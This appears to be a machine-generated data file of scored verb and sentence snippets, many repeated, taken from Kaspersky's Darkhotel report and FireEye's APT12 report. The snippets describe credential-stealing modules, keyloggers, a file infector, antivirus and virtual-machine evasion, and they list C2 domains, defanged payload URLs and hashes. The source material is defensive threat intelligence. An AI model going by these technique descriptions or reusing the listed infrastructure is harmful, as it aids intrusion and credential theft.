%APPDATA%\\microsoft\\dis-\nplay\\ctfmon.exe (md5= e8bfb82b0dd5cef46116d61f62c25060)')(0.7777777777777778, 'drop', '\n</section>\n\n<section>\n<heading>Selective Infector</heading>\n</section>\n<section>\n<heading>Technical Notes</heading>\nIgfxext.exe can download a file and drop it to %APPDATA%\\microsoft\\dis-\nplay\\ctfmon.exe (md5= e8bfb82b0dd5cef46116d61f62c25060)')(0.3333333333333333, 'infiltrate', ' This component is a virus, and is used to selectively infiltrate into other\ncomputers via USB or network shares')(0.5555555555555556, 'saved', ' Please note, that after receiving <DATA>, it is XORed with byte\n     value 0x55 and saved to a disk in a file named «ctfmon.exe» (current directory\n     is used)')(0.75, 'gets', ' It gets\nCPU name and identifier from the registry at HKLM\\HARDWARE\\DESCRIPTION\\\nSystem\\CentralProcessor\\0\nand collects IP and MAC addresses of local network adapters')(0.8181818181818182, 'collects', ' It gets\nCPU name and identifier from the registry at HKLM\\HARDWARE\\DESCRIPTION\\\nSystem\\CentralProcessor\\0\nand collects IP and MAC addresses of local network adapters')(0.7777777777777778, 'executes', '\nAfter stealing secrets from local system the malware executes some kind of\nembedded script')(1.0, 'stealing', '\nAfter stealing secrets from local system the malware executes some kind of\nembedded script')(0.5, 'evade', ' If the process is found it\nkeeps a record of the software name using short AV Identifier string from the fol-\nlowing table of rules\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c                                                                                 \n<header>65</header>\n\n<table>\nProcess Name               AV Identifier                Company Name, Country\n\nekrn.exe                   NOD                          ESET, Czech Republic\n\nNVCAgent.npc               NV                           Naver NHN, Vietnam\n\n360tray.exe                36                           Qihoo 360, China\n\nmsseces.exe                MS                           Microsoft, USA\n\nuiWinMgr.exe               TR                           TrendMicro, Japan\n\nAvastSvc.exe               AST                          Avast, Czech Republic\n\nRsMgrSvr.exe               RS                           Rising, China\n\nmcagent.exe                MC                           McAfee, USA\n\navgidsagent.exe            AV                           AVG, Czech Republic\n\nccsvchst.exe               NT                           Symantec, USA\n\nbdagent.exe                BD                           BitDefender, Romania\n\navp.exe                    KS                           Kaspersky, Russia\n\nV3LTray.exe                V                            AhnLab, South Korea\n\nAYAgent.aye                AY                           ESTSoft, South Korea\n</table>\nThe malware uses a trick to evade running on a VMware')(0.8461538461538461, 'uses', ' Here is the list of\nURLs that are checked by the malware:\n<list>\n•\thttp://twitter.com\n•\thttp://facebook.coom\n•\thttp://passport.yandex.ru/passport\n•\thttp://yandex.ru\n•\thttp://qip.ru\n•\thttp://mail.qip.ru\n•\thttps://login.nifty.com/service/login\n•\thttp://e.mail.ru/cgibin/login\n•\thttp://mail.ru\n•\thttp://mail.126.com\n•\thttp://secure.zapak.com/mail/zapakmail.php\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c\n<header>62</header>\n\n\n•\thttps://lavabit.com/apps/webmail/src/login.php\n•\thttp://www.bigstring.com\n•\thttp://www.gmx.com\n•\thttp://passport.sohu.com/indexaction.action\n•\thttp://www.sohu.com\n•\thttps://www.zoho.com/login.html\n•\thttp://mail.sina.com.cn\n•\thttp://members.sina.com/index.php\n•\thttp://www.care2.com/passport/login.html\n•\thttp://www.mail.com/int\n•\thttps://fastmail.fm/mail\n•\thttps://www.inbox.com/login.aspx\n•\thttp://www.gawab.com\n•\thttp://mail.163.com\n•\thttp://registration.lycos.com/login.php\n•\thttp://mail.lycos.com\n•\thttps://my.screenname.aol.com/_cqr/login/login.psp\n•\thttps://edit.bjs.yahoo.com/config/login\n•\thttps://login.yahoo.co.jp/config/login\n•\thttps://login.yahoo.com/config/login_verify2\n•\thttps://login.live.com/login.srf\n•\thttps://www.google.com/accounts/servicelogin\n</list>\nThe list of targeted services includes some local services specifically popular in:\n<list>\n•\t \tUnited States\n•\t \tRussia\n•\t \tChina\n•\t \tJapan\n•\t \tMiddle Eastern countries\n•\t \tIndia\n</list>\nThe module uses several simple XOR\xadbased algorithms to encrypt embedded\nstring data')(0.5714285714285714, 'stealing', ' In addition it\nmakes use of the following Mozilla Firefox libraries depending on Firefox version:\n<list>\n•\t \tnss3.dll\n•\t \tplc4.dll\n•\t \tmozcrt19.dll\n•\t \tmozutils.dll\n•\t \tmozglue.dll\n•\t \tmozsqlite3.dll\n•\t \tsqlite3.dll\n•\t \tnspr4.dll\n•\t \tplds4.dll\n•\t \tnssutil3.dll\n•\t \tsoftokn3.dll\n</list>\nWhen stealing secrets from Firefox and Chrome it uses built\xadin SQLite library code')(0.5555555555555556, 'uses', '\nIf it is running, it uses simple AV heuristics evasion technique')(0.36363636363636365, 'uploaded', ' The result of this execution is appended\nto the stolen data and uploaded to the C&C server')(0.6, 'sending', '\n<GeneralSysInfo> field contains only basic information about the system, i.e.:\n<list>\nInfo;\nSys@User : MYCOMPUTER@MyUser (0850)\nC P U : Intel(R) Core(TM) i3\xad1667U CPU @ 1600GHz\nSystem OS: Microsoft Windows XP (Service Pack 3)\nNet card : 192.168.0.2 (133773311337)\n</list>\nIf the server reply contains a keyword «minmei» it continues sending additional in-\nformation')(0.2, 'writes', '\nThis component then encrypts and writes the retrieved values ondisk to a ran-\n\n\n<footer>\nTLP: Green\t              For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c\n<header>70</header>\n\n\ndomly named .tmp, file like ffffz07131101.tmp')(0.5263157894736842, 'spawns', ' It spawns an-\nother suspended process with its own igfxext.exe image, but decrypts a smaller\n32kb executable (cf1319d94f33380622ba000b7d8ad6e9,Trojan\xadDownloader')(0.1111111111111111, 'check', ' The list of deleted\nfiles includes the following:\n<list>\n•\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\dtlcntr.exe\n•\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\googletoolbar.exe\n•\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\active.dll\n•\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\detect.dll\n</list>\nThe next is step is to check if current directory has a file named «U»')(0.6666666666666666, 'drop', ' All of these infected files drop a 63kb self injecting compo-\nnent')(0.6363636363636364, 'collect', ' The main purpose of the module is to collect various secrets stored on a\nlocal system')(1.0, 'makes', ' If not, it triggers a special variable that makes module dormant and dis-\nables further communication with C&C server')(0.8333333333333334, 'implements', '\nThe module implements a method to resist running in virtual environment')(0.9, 'starts', ' The code starts a\nthread that simulates keystrokes of ESC keyboard key and then shows a system\nmodal message box')(0.6, 'wipes', ' If «U» file is older than 180 days, the module wipes\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c                                                                                  \n<header>59</header>\n\n\nthe file')(0.09090909090909091, 'has', ' Every infected file has functionality described in\nTrojan\xadDropper & Injector section, so it can collect information about the comput-\ner, send it to the C2 and download other Darkhotel components as commanded')(1.0, 'download', ' Every infected file has functionality described in\nTrojan\xadDropper & Injector section, so it can collect information about the comput-\ner, send it to the C2 and download other Darkhotel components as commanded')(1.0, 'send', ' Every infected file has functionality described in\nTrojan\xadDropper & Injector section, so it can collect information about the comput-\ner, send it to the C2 and download other Darkhotel components as commanded')(1.0, 'collect', ' Every infected file has functionality described in\nTrojan\xadDropper & Injector section, so it can collect information about the comput-\ner, send it to the C2 and download other Darkhotel components as commanded')(0.8666666666666667, 'adds', ' The module adds autorun registry\nsettings to enable an automatic start during system boot')(0.18181818181818182, 'use', ' These weak encryption keys, when broken, could\nallow an attacker to use the certificates fraudulently to spoof content, perform\nphishing attacks, or perform man\xadin\xadthe\xadmiddle attacks against all Web browser\nusers including users of Internet Explorer')(0.8461538461538461, 'maintain', ' The attackers maintain\na\xa0web interface to vet these new victim systems')(0.7272727272727273, 'drops', ' It drops the igfxext.exe “selective infector” component to disk and\nruns it')(0.5, 'runs', ' It drops the igfxext.exe “selective infector” component to disk and\nruns it')(0.375, 'delete', '\nThe attackers were also very careful to immediately delete all traces of their\ntools as soon as an attack was carried out successfully')(1.0, 'seeds', '\n</section>\n\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c                                                                                       \n<header>7</header>\n\n<section>\n<heading>Indiscriminate Spread</heading>\nAn example of the Darkhotel APT’s indiscriminate malware spreading is dem-\nonstrated by the way it seeds Japanese p2p sharing sites, where the malware\nis delivered as a part of a large (approximately 900mb) rar archive')(0.3076923076923077, 'include', ' Related\nDarkhotel command and control server domains include:\n<list>\n microblo5.mooo.com\n microyours.ignorelist.com\n micronames.jumpingcrab.com\n microchisk.mooo.com\n microalba.serveftp.com\n</list>\n</section>\n\n<section>\n<heading>Darkhotel Spear-phishing Campaigns</heading>\nDarkhotel campaigns involving typical spear-phished Tapaoux implants publicly\nappeared in bits and pieces several times over the past five years')(1.0, 'involving', ' Related\nDarkhotel command and control server domains include:\n<list>\n microblo5.mooo.com\n microyours.ignorelist.com\n micronames.jumpingcrab.com\n microchisk.mooo.com\n microalba.serveftp.com\n</list>\n</section>\n\n<section>\n<heading>Darkhotel Spear-phishing Campaigns</heading>\nDarkhotel campaigns involving typical spear-phished Tapaoux implants publicly\nappeared in bits and pieces several times over the past five years')(0.3333333333333333, 'deployed', ' In\nthe past few years, they deployed 0-day spear-phishing attacks targeting Adobe\nproducts and Microsoft Internet Explorer, including cve\xad2010\xad0188')(0.6666666666666666, 'targeting', ' In\nthe past few years, they deployed 0-day spear-phishing attacks targeting Adobe\nproducts and Microsoft Internet Explorer, including cve\xad2010\xad0188')(0.9047619047619048, 'was', '\n                               sha1/RSA (2048bits)\n</table>\n</section>\n\n<footer>\nTLP: Green\t                    For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c                                                                                   \n<header>13</header>\n\n<section>\n<heading>Enhanced Keyloggers and Development</heading>\nOne of the most interesting components that we discovered as a part of this cam-\npaign was the use of a digitally\xadsigned advanced keylogger')(0.4, 'retrieves', ' It is slightly surprising that no rootkit functionality\nhides this service:\n\n<figure></figure>\n\n\nWhen loaded, the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff, and\nretrieves keystroke data directly from port 0x60, the motherboard keyboard con-\ntroller itself')(0.2727272727272727, 'executed', ' In a recent case, word docs embed-\nded with 0-day flash swf files either dropped these backdoors or downloaded and\nexecuted backdoors from remote web servers')(0.2777777777777778, 'dropped', ' In a recent case, word docs embed-\nded with 0-day flash swf files either dropped these backdoors or downloaded and\nexecuted backdoors from remote web servers')(0.2, 'downloaded', ' In a recent case, word docs embed-\nded with 0-day flash swf files either dropped these backdoors or downloaded and\nexecuted backdoors from remote web servers')(0.2222222222222222, 'starts', '\n<list>\n•\t small downloader\n•\t information stealer\n•\t Trojan\n•\t dropper and self\xadinjector\n•\t selective infector\n</list>\nThe most interesting behaviors of these components include\n<list>\n•\t highly unusual conditional 180 day command and control communications\n   delay\n•\t self\xadkill routines when the system default codepage is set to Korean\n•\t enhanced Microsoft IntelliForm authentication theft handling\n•\t infostealer module Internet Explorer, Firefox, and Chrome support\n•\t campaign or stage ID maintenance\n•\t virtual machine execution sensitivity\n•\t selective viral infection routines to focus the spread of malware within organi-\n   zations\n•\t signed malcode (previously noted)\n</list>\n</section>\n\n<section>\n<heading>Small Downloader</heading>\nThis module is quite small (27Kb) and comes as a part of WinRar SFX file that drops\nand starts the module from %APPDATA%\\Microsoft\\Crypto\\DES64v7\\msieckc.exe')(1.0, 'drops', '\n<list>\n•\t small downloader\n•\t information stealer\n•\t Trojan\n•\t dropper and self\xadinjector\n•\t selective infector\n</list>\nThe most interesting behaviors of these components include\n<list>\n•\t highly unusual conditional 180 day command and control communications\n   delay\n•\t self\xadkill routines when the system default codepage is set to Korean\n•\t enhanced Microsoft IntelliForm authentication theft handling\n•\t infostealer module Internet Explorer, Firefox, and Chrome support\n•\t campaign or stage ID maintenance\n•\t virtual machine execution sensitivity\n•\t selective viral infection routines to focus the spread of malware within organi-\n   zations\n•\t signed malcode (previously noted)\n</list>\n</section>\n\n<section>\n<heading>Small Downloader</heading>\nThis module is quite small (27Kb) and comes as a part of WinRar SFX file that drops\nand starts the module from %APPDATA%\\Microsoft\\Crypto\\DES64v7\\msieckc.exe')(0.26666666666666666, 'terminate', ' The main purpose of the module is to collect various secrets stored on a lo-\ncal system and upload them to Darkhotel command and control servers:\n<list>\n•\t   Cached passwords from Internet Explorer 6/7/8/9 (Windows Protected Storage)\n•\t   Mozilla Firefox stored secrets (<12.0)\n•\t   Chrome stored secrets\n•\t   Gmail Notifier credentials\n•\t   Intelliform\xadhandled data and credentials:\n     ◦◦ Twitter\n     ◦◦ Facebook\n     ◦◦ Yandex\n     ◦◦ Qip\n     ◦◦ Nifty\n     ◦◦ Mail.ru\n     ◦◦ 126.com email\n     ◦◦ Zapak\n     ◦◦ Lavabit (encrypted email service now shut down)\n     ◦◦ Bigstring\n     ◦◦ Gmx\n     ◦◦ Sohu\n     ◦◦ Zoho\n     ◦◦ Sina\n     ◦◦ Care2\n     ◦◦ Mail.com\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c                                                                                  \n<header>17</header>\n\n\n   ◦◦ Fastmail\n   ◦◦ Inbox\n   ◦◦ Gawab (middle\xadeastern email service)\n   ◦◦ 163.com\n   ◦◦ Lycos\n   ◦◦ Lycos mail\n   ◦◦ Aol login\n   ◦◦ Yahoo! logins\n   ◦◦ Yahoo! Japan logins\n   ◦◦ Microsoft Live logins\n   ◦◦ Google login credentials\n</list>\nThis module is designed to terminate itself on Windows with the system de-\nfault codepage set to Korean')(0.8181818181818182, 'collect', ' The main purpose of the module is to collect various secrets stored on a lo-\ncal system and upload them to Darkhotel command and control servers:\n<list>\n•\t   Cached passwords from Internet Explorer 6/7/8/9 (Windows Protected Storage)\n•\t   Mozilla Firefox stored secrets (<12.0)\n•\t   Chrome stored secrets\n•\t   Gmail Notifier credentials\n•\t   Intelliform\xadhandled data and credentials:\n     ◦◦ Twitter\n     ◦◦ Facebook\n     ◦◦ Yandex\n     ◦◦ Qip\n     ◦◦ Nifty\n     ◦◦ Mail.ru\n     ◦◦ 126.com email\n     ◦◦ Zapak\n     ◦◦ Lavabit (encrypted email service now shut down)\n     ◦◦ Bigstring\n     ◦◦ Gmx\n     ◦◦ Sohu\n     ◦◦ Zoho\n     ◦◦ Sina\n     ◦◦ Care2\n     ◦◦ Mail.com\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c                                                                                  \n<header>17</header>\n\n\n   ◦◦ Fastmail\n   ◦◦ Inbox\n   ◦◦ Gawab (middle\xadeastern email service)\n   ◦◦ 163.com\n   ◦◦ Lycos\n   ◦◦ Lycos mail\n   ◦◦ Aol login\n   ◦◦ Yahoo! logins\n   ◦◦ Yahoo! Japan logins\n   ◦◦ Microsoft Live logins\n   ◦◦ Google login credentials\n</list>\nThis module is designed to terminate itself on Windows with the system de-\nfault codepage set to Korean')(0.8, 'upload', ' The main purpose of the module is to collect various secrets stored on a lo-\ncal system and upload them to Darkhotel command and control servers:\n<list>\n•\t   Cached passwords from Internet Explorer 6/7/8/9 (Windows Protected Storage)\n•\t   Mozilla Firefox stored secrets (<12.0)\n•\t   Chrome stored secrets\n•\t   Gmail Notifier credentials\n•\t   Intelliform\xadhandled data and credentials:\n     ◦◦ Twitter\n     ◦◦ Facebook\n     ◦◦ Yandex\n     ◦◦ Qip\n     ◦◦ Nifty\n     ◦◦ Mail.ru\n     ◦◦ 126.com email\n     ◦◦ Zapak\n     ◦◦ Lavabit (encrypted email service now shut down)\n     ◦◦ Bigstring\n     ◦◦ Gmx\n     ◦◦ Sohu\n     ◦◦ Zoho\n     ◦◦ Sina\n     ◦◦ Care2\n     ◦◦ Mail.com\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c                                                                                  \n<header>17</header>\n\n\n   ◦◦ Fastmail\n   ◦◦ Inbox\n   ◦◦ Gawab (middle\xadeastern email service)\n   ◦◦ 163.com\n   ◦◦ Lycos\n   ◦◦ Lycos mail\n   ◦◦ Aol login\n   ◦◦ Yahoo! logins\n   ◦◦ Yahoo! Japan logins\n   ◦◦ Microsoft Live logins\n   ◦◦ Google login credentials\n</list>\nThis module is designed to terminate itself on Windows with the system de-\nfault codepage set to Korean')(0.6666666666666666, 'continues', ' This spear-phishing activity continues into\n2014')(1.0, 'maintain', ' But the\nattackers also maintain truly precise targeting information over the victim’s visit,\nmuch like they would know a victim’s email address and content interests in a\nspearphishing attack')(0.36363636363636365, 'bound', '\nCatch.exe, detected as Backdoor.Win32.Agent.dgrn, communicates with the fol-\nlowing Darkhotel command and control servers:\n<list>\nmicrodelta.crabdance.com\nmicroyours.ignorelist.com\nmicronames.jumpingcrab.com\nmicrochisk.mooo.com\nmicroalba.serveftp.com\n</list>\n\n<footer>\nTLP: Green\t                  For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c\n<header>8</header>\n\n\nOther examples of this Darkhotel backdoor bound within a shared torrent include\nadult content Japanese anime and more')(0.2, 'detected', '\nCatch.exe, detected as Backdoor.Win32.Agent.dgrn, communicates with the fol-\nlowing Darkhotel command and control servers:\n<list>\nmicrodelta.crabdance.com\nmicroyours.ignorelist.com\nmicronames.jumpingcrab.com\nmicrochisk.mooo.com\nmicroalba.serveftp.com\n</list>\n\n<footer>\nTLP: Green\t                  For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c\n<header>8</header>\n\n\nOther examples of this Darkhotel backdoor bound within a shared torrent include\nadult content Japanese anime and more')(0.8, 'complicated', ' It was built as MFC framework application with a\nlot of extra calls that should have complicated the analysis of the sample')(0.375, 'maintains', ' This file is located\nin the same directory as the original dropper, which maintains persistence across\nreboots with a simple addition to the HKCU run key')(0.2, 'upgrading', ' This is becoming more and more common on the APT scene,\nwhere targeted attacks are used to compromise high profile victims and botnet\nstyle operations are used for massive surveillance or performing other tasks such\nas launching DDoS attacks on hostile parties or simply upgrading victims to more\nsophisticated espionage tools')(0.46153846153846156, 'launching', ' This is becoming more and more common on the APT scene,\nwhere targeted attacks are used to compromise high profile victims and botnet\nstyle operations are used for massive surveillance or performing other tasks such\nas launching DDoS attacks on hostile parties or simply upgrading victims to more\nsophisticated espionage tools')(0.4, 'compromise', ' This is becoming more and more common on the APT scene,\nwhere targeted attacks are used to compromise high profile victims and botnet\nstyle operations are used for massive surveillance or performing other tasks such\nas launching DDoS attacks on hostile parties or simply upgrading victims to more\nsophisticated espionage tools')(0.7857142857142857, 'deleted', ' As soon as their target’s stay was over and\nthe attack-frame was closed, the attackers deleted their iframe placement and\nbackdoored executables from the hotel network')(0.3076923076923077, 'collects', ' The Trojan collects data about the system and anti\xad\nmalware software installed on it, and uploads that data to Darkhotel command\nand control servers')(1.0, 'retrieved', ' The attacks follow the typical spear-phishing process and in the past couple of\nmonths, exploited systems retrieved downloader executables from web servers like\n<list>\nhxxp://office\xadrevision.com/update/files22/update.exe or hxxp://trade\xadinf.com/mt/\nduspr.exe\n</list>\nOver the past few years the group has emailed links that redirect targets’ brows-\ners to Internet Explorer 0-day exploits')(0.26666666666666666, 'emailed', ' The attacks follow the typical spear-phishing process and in the past couple of\nmonths, exploited systems retrieved downloader executables from web servers like\n<list>\nhxxp://office\xadrevision.com/update/files22/update.exe or hxxp://trade\xadinf.com/mt/\nduspr.exe\n</list>\nOver the past few years the group has emailed links that redirect targets’ brows-\ners to Internet Explorer 0-day exploits')(1.0, 'follow', ' The attacks follow the typical spear-phishing process and in the past couple of\nmonths, exploited systems retrieved downloader executables from web servers like\n<list>\nhxxp://office\xadrevision.com/update/files22/update.exe or hxxp://trade\xadinf.com/mt/\nduspr.exe\n</list>\nOver the past few years the group has emailed links that redirect targets’ brows-\ners to Internet Explorer 0-day exploits')(0.6666666666666666, 'bound', ' These tools are dropped by hotel installers spoofing legiti-\nmate software installers, bound within torrent bundles, or dropped by exploits or\nhypertext linked from spear-phishing emails')(0.42857142857142855, 'dropped', ' These tools are dropped by hotel installers spoofing legiti-\nmate software installers, bound within torrent bundles, or dropped by exploits or\nhypertext linked from spear-phishing emails')(0.7142857142857143, 'are dropped', ' These tools are dropped by hotel installers spoofing legiti-\nmate software installers, bound within torrent bundles, or dropped by exploits or\nhypertext linked from spear-phishing emails')(0.8571428571428571, 'posing', '\nThe following list presents a set of characteristics for the crew:\n<list>\n•\t operational competence to compromise, mis-use, and maintain access to\n   global scale, trusted commercial network resources with strategic precision\n   for years\n•\t advanced mathematical and crypto-analytical offensive capabilities, along\n   with no regard for undermining the trust extended to the Certificate Authorities\n   and the PKI\n•\t indiscriminately infect systems with some regional clarity over trusted and\n   untrusted resources to build and operate large botnets\n•\t well-developed low level keyloggers within an effective and consistent toolset\n•\t a focus throughout campaigns on specific victim categories and tagging them\n•\t a larger, dynamic infrastructure built of apache webservers, dynamic dns\n   records, crypto libraries, and php webapps\n•\t regular 0-day access - recent deployment of an embedded Adobe Flash 0-day\n   spear-phishing exploit, and infrequent deployment of other 0-day resources to\n   sustain larger campaigns over several years\n</list>\n<figure></figure>\n</section>\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c\n<header>4</header>\n\n<section>\n<heading>Introduction</heading>\nWhen unsuspecting guests, including situationally aware corporate executives and\nhigh-tech entrepreneurs, travel to a variety of hotels and connect to the internet,\nthey are infected with a rare APT Trojan posing as any one of several major software\nreleases')(1.0, 'changes', '\nDuring its infection routine, the infector changes the entrypoint of executable\nfiles, creates an .rdat section, and inserts a small loader in the section, then puts\nits main payload in the overlay')(0.5, 'puts', '\nDuring its infection routine, the infector changes the entrypoint of executable\nfiles, creates an .rdat section, and inserts a small loader in the section, then puts\nits main payload in the overlay')(0.5454545454545454, 'creates', '\nDuring its infection routine, the infector changes the entrypoint of executable\nfiles, creates an .rdat section, and inserts a small loader in the section, then puts\nits main payload in the overlay')(0.46153846153846156, 'inserts', '\nDuring its infection routine, the infector changes the entrypoint of executable\nfiles, creates an .rdat section, and inserts a small loader in the section, then puts\nits main payload in the overlay')(0.3333333333333333, 'infiltrate', '\n</section>\n\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c\n<header>18</header>\n\n<section>\n<heading>Selective Infector</heading>\nThis component is a virus, and is used to selectively infiltrate into other comput-\ners via USB or network shares')(0.7142857142857143, 'drops', '\n</section>\n\n<section>\n<heading>Information Stealer</heading>\nThis module is relatively large (455Kb) and comes as a part of a WinRar SFX file\nthat drops and starts the module from %APPDATA%\\Microsoft\\Display\\DmaUp3')(0.5454545454545454, 'starts', '\n</section>\n\n<section>\n<heading>Information Stealer</heading>\nThis module is relatively large (455Kb) and comes as a part of a WinRar SFX file\nthat drops and starts the module from %APPDATA%\\Microsoft\\Display\\DmaUp3')(0.4117647058823529, 'were', '\n\n<figure></figure>\n\n\nOf course, these packages were really installers for Darkhotel APT’s backdoors,\nadded to legitimate installers from Adobe and Google')(0.8181818181818182, 'present', ' This data enables the attackers to present the malicious\niframe precisely to that individual target')(1.0, 'retrieves', '\nFirst, the virus retrieves all available disks and starting from disk number 4 (D:\\)\nto disk number 20 (Z:\\), finds executable files and infects them')(0.2777777777777778, 'finds', '\nFirst, the virus retrieves all available disks and starting from disk number 4 (D:\\)\nto disk number 20 (Z:\\), finds executable files and infects them')(0.75, 'maintains', '\n</section>\n\n<section>\n<heading>Campaign Codes</heading>\nAlmost every backdoor in this set maintains an internal campaign code or id, used\nin initial c2 communications as described above')(0.7777777777777778, 'includes', ' Sometimes the attachment itself includes\nan Adobe 0-day exploit')(0.8, 'uses', ' Darkhotel uses this method to\ndistribute their Karba Trojan')(0.7, 'steal', ' These tools pull down the keylog-\nger, steal information from the system, or download other tools')(0.4444444444444444, 'download', ' These tools pull down the keylog-\nger, steal information from the system, or download other tools')(0.3333333333333333, 'removing', ' It is also capable of removing some older components, the names\nof which are hardcoded in the body of the malware')(1.0, 'gathers', '\nThe component gathers system information and sends it to the Darkhotel com-\nmand and control servers as detailed in Appendix D')(0.75, 'sends', '\nThe component gathers system information and sends it to the Darkhotel com-\nmand and control servers as detailed in Appendix D')(1.0, 'identify', '\nThis first stage of malware helps the attackers to identify more significant victims,\nleading to the selective download of more advanced stealing tools')(0.6923076923076923, 'maintain', '\nThe Darkhotel c2 maintain these directory structures to store and serve ddrlog\ncontent:\n<list>\n•\t /bin/error/ddrlog\n•\t /patch/error/ddrlog\n</list>\n\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c                                                                                     \n<header>23</header>\n\n\nThe following structures appear to be common across servers, but do not pro-\nduce ddrlog and do not maintain an /error/ directory:\n<list>\n•\t /u2/\n•\t /u3/\n•\t /patch2/\n•\t /major/\n•\t inor/\n•\t /asp/\n•\t /update3/\n</list>\nTwo ddrlog files report entries starting January 1, 2009 at 9:16 a.m')(0.8666666666666667, 'is', '\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\x0c\n<header>16</header>\n\n\nOne of the most interesting functions of this executable is its unusual delay and\npersistence')(0.8461538461538461, 'maintain', '\n\n<figure></figure>\n\n</section>\n\n<section>\n<heading>Available ddrlog Victim Data</heading>\nMany of these c2s maintain a common directory path that serves a ddrlog')(0.7777777777777778, 'hit', ' The attackers set up the environment and hit their\nindividual targets with precision')(0.21428571428571427, 'writes', ' This component then encrypts and writes the retrieved values\nondisk to a randomly named .tmp, file like ffffz07131101.tmp')(0.7777777777777778, 'received', '\n\n<figure></figure>\n\n\nThe most interesting thing about this delivery method is that the hotels require\nguests to use their last name and room number to login, yet only a few guests\nreceived the Darkhotel package')(0.4166666666666667, 'update', '\nThis module is designed to update malicious components through recurring checks\nat the C&C server')(0.6666666666666666, 'delivered', ' The dropped downloader\n(d8137ded710d83e2339a97ee78494c34) delivered malcode similar to the\n“Information Stealer” component functionality summarized below, and detailed\nin Appendix D')(0.2727272727272727, 'seeding', ' Addition-\nally, seeding p2p networks with widely spread malware and 0-day spear-phishing\nattacks demonstrate that the Darkhotel APT maintains an effective toolset and a\nlong-running operation behind the questionable hospitality it shows its guests')(0.7142857142857143, 'communicates', '\n</section>\n\n<section>\n<heading>Background</heading>\n\nFrom October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor\nthat communicates via HTTP to a hard-coded command and control (C2) server')(0.8333333333333334, 'contained', ' This spear phish contained a malicious Word document that\nexploited CVE-2012-0158')(0.8666666666666667, 'sent', '\n</section>\n\n<section>\n<heading>THREEBYTE Malware Family</heading>\n\nOn Monday August 25, 2014 we observed a different spear phish email sent from lilywang823@gmail.com\nto a technology company located in Taiwan')(0.625, 'deliver', ' FireEye observed APT12 deliver these exploit documents\nvia phishing emails in multiple cases')(1.0, 'dropped', '\n\nSimilar to the newly discovered HIGHTIDE samples documented above, this malicious document dropped\na backdoor to C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\word.exe')(0.2222222222222222, 'decrease', '\nWe suspect this change was a direct result of the Arbor blog post in order to decrease detection of\nRIPTIDE by security vendors')(0.7777777777777778, 'dropped', ' This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e\nand dropped a backdoor to C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\word.exe')(0.7777777777777778, 'communicates', '\n\nSimilar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that\ncommunicates with its C2 server')(0.5833333333333334, 'Attached', ' Attached to this email was another malicious document that was designed to exploit\nCVE-2012-0158')(1.0, 'utilize', ' Based on past APT12 activity, we expect the threat group to continue\nto utilize phishing as a malware delivery method')(0.8, 'sent', '\n</section>\n\n<section>\n<heading>HIGHTIDE Malware Family</heading>\n\nOn Sunday August 24, 2014 we observed a spear phish email sent to a Taiwanese government ministry')(0.8, 'targeting', '\n</list>\n</section>\n\n<section>\n<heading>WATERSPOUT Malware Family</heading>\n\nOn August 25, 2014, we observed another round of spear phishing emails targeting a high-technology\ncompany in Japan')(0.4375, 'drops', ' The RIPTIDE exploit document drops its\nexecutable file into the C:\\Documents and Settings\\{user}\\Application Data\\Location folder while the\nHIGHTIDE exploit document drops its executable file into the C:\\DOCUMENTS and SETTINGS\\\n{user}\\LOCAL SETTINGS\\Temp\\ folder')(1.0, 'drops', '\n<figure>\nMD5                              File Name                            Exploit\n73f493f6a2b0da23a79b50765c164e88 議程最新修正及注意事項.doc                      CVE-2012-0158\nf6fafb7c30b1114befc93f39d0698560 0824.1.doc                           CVE-2012-0158\neaa6e03d9dae356481215e3a9d2914dc 簡易名冊0全國各警察機關主官至分局 CVE-2012-0158\n                                 長.doc\n06da4eb2ab6412c0dc7f295920eb61c4 附 .doc                               CVE-2012-0158\n53baedf3765e27fb465057c48387c9b6 103年第3屆通 錄.doc                       CVE-2012-0158\n00a95fb30be2d6271c491545f6c6a707 2014 09 17 Welcome Reception for Bob CVE-2012-0158\n                                 and Jason_invitation.doc\n4ab6bf7e6796bb930be2dd0141128d06 產諮會_Y103(2)委員會_從東協新興國家 CVE-2012-0158\n                                 崛起(0825).doc\n</figure>\n<caption>Figure 4: Identified exploit documents for HIGHTIDE</caption>\n\nWhen the file is opened, it drops HIGHTIDE in the form of an executable file onto the infected system')(0.7, 'install', '\n<table>\nURL                    Meta Refresh Page\n\x0c\nhXXp://985.so/bUYj  N/A (HTTP 404)\nhXXp://985.so/bUYe  hXXp://58.64.178.77:80/SiteLoader\nhXXp://985.so/b6hW  hXXp://58.64.178.77/mPlayer\nhXXp://985.so/bUYf  hXXp://58.64.178.77:80/0wnersh1p\n</table>\nThese pages load scripts that conduct profiling of the system for various 